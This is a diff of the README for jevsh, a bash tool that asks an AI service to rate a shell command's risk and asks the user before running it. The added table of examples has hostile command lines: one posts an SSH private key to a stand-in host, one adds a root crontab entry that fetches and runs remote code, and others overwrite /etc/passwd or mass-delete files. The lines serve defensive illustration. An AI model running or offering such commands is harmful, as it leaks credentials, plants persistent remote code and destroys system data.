@@ -2,56 +2,60 @@
 
 English | [日本語](README.ja.md)
 
-Ask JEV how risky a shell command is before you run it.
+**Everyone knows `rm -rf /` is dangerous. But `ls -la` is harmless on its own, and `ls -la > /etc/passwd` in a root shell overwrites your user database.** The danger is often not in a single command but in how commands are combined: redirections, pipes, `&&` and `;`. jevsh asks jev about the whole command line, exactly as you typed it, right before it runs.
 
-jevsh sends the command line you give it to the JEV AI service (TypeSafe), shows the risk level (LOW / MEDIUM / HIGH / CRITICAL) with its confidence, and runs the command only if you answer `y`. JEV only advises; you decide.
+Type a command as usual and press **Ctrl+Enter** instead of Enter. jev tells you how risky the line is, and if you answer `y`, it runs right there. Enter alone works exactly as before.
+
+In a root shell (for example after `sudo -i`):
 
 ```text
-$ jevsh rm -rf ./build
-Command: rm -rf ./build
-JEV risk: HIGH (confidence 60%)
-  LOW 1%  MEDIUM 29%  HIGH 70%  CRITICAL 0%
+# ls -la > /etc/passwd      <- press Ctrl+Enter (or Ctrl+X Enter) instead of Enter
+Command: ls -la > /etc/passwd
+jev risk: CRITICAL (confidence 89%)
+  LOW 0%  MEDIUM 0%  HIGH 8%  CRITICAL 92%
 Run this command?
   y      run it now
   n      cancel (Enter also cancels)
 [y/N]: n
-Canceled.
+Canceled. The line stays at the prompt for editing.
 ```
+
+Some command lines that become dangerous only because of how they are put together (root shell; jev's level and confidence, one run each, 2026-09-26):
+
+| Command line | jev |
+|---|---|
+| `ls -la` | LOW 1.00 |
+| `ls -la > /etc/passwd` | CRITICAL 0.87 |
+| `sort users.csv > users.csv` | HIGH 0.92 |
+| `find / -name "*.log" \| xargs rm -f` | CRITICAL 0.89 |
+| `cat ~/.ssh/id_ed25519 \| curl -s -X POST --data-binary @- https://example.com/upload` | CRITICAL 0.50 |
+| `echo "* * * * * root curl -s http://example.com/x \| sh" >> /etc/crontab` | CRITICAL 0.89 |
+
+jevsh sends the command line to the jev AI service (TypeSafe), shows the risk level (LOW / MEDIUM / HIGH / CRITICAL) with its confidence, and runs it only if you answer `y`. jev only advises; you decide. You can also type `jevsh COMMAND`, or use `jevsh --check` in scripts.
 
 ## Requirements
 
 - Linux with bash 4.4 or later
 - `curl`
-- A JEV API key from TypeSafe
+- A jev API key from TypeSafe
 
 jevsh is a single bash script. It does not need root, and it does not install anything else.
 
 ## Install
 
-Run this one line. It downloads the v0.3.2 release, checks it against `SHA256SUMS`, installs it to `~/.local/bin`, and prints the version.
-
 ```bash
-mkdir -p ~/.local/bin && cd "$(mktemp -d)" && curl -fsSL --remote-name-all https://raw.githubusercontent.com/takeshiue/jevsh/v0.3.2/{jevsh,SHA256SUMS} && sha256sum -c SHA256SUMS && install -m 755 jevsh ~/.local/bin/jevsh && ~/.local/bin/jevsh --version
+curl -fsSLO https://raw.githubusercontent.com/takeshiue/jevsh/main/install.sh && bash install.sh
 ```
 
-If `jevsh` is then "command not found", `~/.local/bin` is not in your `PATH` yet. Log in again or run `source ~/.profile`; if that does not help, run `echo 'export PATH="$HOME/.local/bin:$PATH"' >> ~/.bashrc && source ~/.bashrc`.
+`install.sh` downloads the latest release, checks it against `SHA256SUMS` and, if `ssh-keygen` is available, against the signature of the jevsh release key (`SHA256:LIdW6JBHIV1YvPQHU+suSOe87ZJgNZGZlfjNdl1kkKg`). It then copies jevsh to `~/.local/bin`. It does not change `~/.bashrc` or anything else. You can read `install.sh` before running it; it is short.
 
-To install for all users, replace `install -m 755 jevsh ~/.local/bin/jevsh` with `sudo install -m 755 jevsh /usr/local/bin/jevsh`.
+If `jevsh` is then "command not found", `~/.local/bin` is not in your `PATH` yet; `install.sh` prints the line to add. To install elsewhere, for example for all users, run `sudo JEVSH_INSTALL_DIR=/usr/local/bin bash install.sh`.
 
-jevsh is a single file; there is no installer. Please do not pipe it into a shell (`curl ... | bash`).
+Please do not pipe the script into a shell (`curl ... | bash`). Download it, then run it.
 
-### Verify the signature (optional)
+### Without install.sh
 
-`SHA256SUMS` is signed with the jevsh release key. To check that the download really comes from the author, run this in the same directory after the install line:
-
-```bash
-curl -fsSL --remote-name-all https://raw.githubusercontent.com/takeshiue/jevsh/v0.3.2/{SHA256SUMS.sig,jevsh-release.pub}
-ssh-keygen -lf jevsh-release.pub
-echo "takeshi.uematsu@gmail.com $(cat jevsh-release.pub)" > allowed_signers
-ssh-keygen -Y verify -f allowed_signers -I takeshi.uematsu@gmail.com -n file -s SHA256SUMS.sig < SHA256SUMS
-```
-
-The fingerprint printed by the second line must be `SHA256:LIdW6JBHIV1YvPQHU+suSOe87ZJgNZGZlfjNdl1kkKg`, and the last line must print `Good "file" signature`.
+jevsh is a single file. You can download `jevsh` and `SHA256SUMS` from a tag, check them with `sha256sum -c --ignore-missing SHA256SUMS`, and copy `jevsh` anywhere in your `PATH`.
 
 ## First run
 
@@ -61,17 +65,23 @@ You can also set the key with the `JEV_API_KEY` environment variable, or registe
 
 ## Usage
 
-```text
-jevsh [options] COMMAND [ARGS...]    assess, confirm, then run
-jevsh [options] -c 'COMMAND LINE'    same, for a full line (pipes etc.)
-jevsh --check [--fail-on LEVEL] COMMAND [ARGS...]
-jevsh --check [--fail-on LEVEL] -c 'COMMAND LINE'
-jevsh --set-key
-jevsh --init bash
-jevsh --yes | --no-jev COMMAND [ARGS...]
-jevsh --enable-keybinding | --disable-keybinding
-jevsh --help | --version
-```
+| Command | What it does |
+|---|---|
+| `jevsh COMMAND [ARGS...]` | Assess COMMAND, show the risk, and run it only if you answer `y` |
+| `jevsh -c 'COMMAND LINE'` | Same, for a whole line with pipes or redirections |
+| `jevsh --check COMMAND [ARGS...]` | Assess only. Prints one line (`RISK CONFIDENCE LINE`), never asks, never runs |
+| `jevsh --check -c 'COMMAND LINE'` | Same, for a whole line |
+| `jevsh --check --fail-on LEVEL ...` | Also exit with status 1 when the risk is LEVEL or higher (for scripts) |
+| `jevsh --yes COMMAND [ARGS...]` | Assess and show the result, then run without asking |
+| `jevsh --no-jev COMMAND [ARGS...]` | Run without assessment and without asking |
+| `jevsh --set-key` | Register or replace your jev API key |
+| `jevsh --enable-keybinding` | Add the Ctrl+Enter / Ctrl+X Enter key binding to `~/.bashrc` (asks first, keeps a backup) |
+| `jevsh --disable-keybinding` | Remove the key binding from `~/.bashrc` |
+| `jevsh --init bash` | Print the bash code for the key binding. `~/.bashrc` runs it; you rarely need it yourself |
+| `jevsh --help` | Show the help |
+| `jevsh --version` | Show the version and date |
+
+LEVEL is `LOW`, `MEDIUM`, `HIGH` or `CRITICAL`. Options go before the command; use `--` if the command itself starts with `-`.
 
 Only `y` or `Y` runs the command. Anything else, including Enter alone, cancels.
 
@@ -94,7 +104,7 @@ jevsh -c 'cat data.csv | sort > out.txt'    # assesses the full line
 jevsh cat data.csv | sort > out.txt         # assesses only "cat data.csv"
 ```
 
-### Key binding
+### Assess with Ctrl+Enter
 
 With the key binding you do not need to type `jevsh` or quotes. Type a command as usual, then press **Ctrl+X Enter** instead of Enter. The whole line, including pipes and redirections, is assessed. If you answer `n`, the line stays at the prompt so you can edit it. Enter alone still runs commands normally, without assessment.
 
@@ -193,7 +203,7 @@ rm -r ~/.config/jevsh
 
 ## Speed and accuracy
 
-jevsh adds about 0.2 seconds per command, almost all of it the JEV API round trip. For 40 sample command lines, JEV's risk level matched the author's expectation for 29–31 of 40 in each of three runs. See [docs/benchmark.md](docs/benchmark.md) for the full results and raw data.
+jevsh adds about 0.2 seconds per command, almost all of it the jev API round trip. For 40 sample command lines, jev's risk level matched the author's expectation for 29–31 of 40 in each of three runs. See [docs/benchmark.md](docs/benchmark.md) for the full results and raw data.
 
 ## License
 
